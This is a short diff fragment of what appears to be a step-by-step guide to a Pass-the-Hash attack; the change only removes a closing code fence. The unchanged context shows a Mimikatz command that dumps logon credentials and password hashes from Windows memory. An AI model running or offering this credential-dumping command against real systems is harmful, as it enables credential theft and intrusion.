@@ -25,7 +25,6 @@ Here is a step-by-step guide to performing a PtH attack, including the tools and
 Example command using Mimikatz:
 ```bash
 mimikatz.exe privilege::debug sekurlsa::logonpasswords
-```
 
 
 <br/>
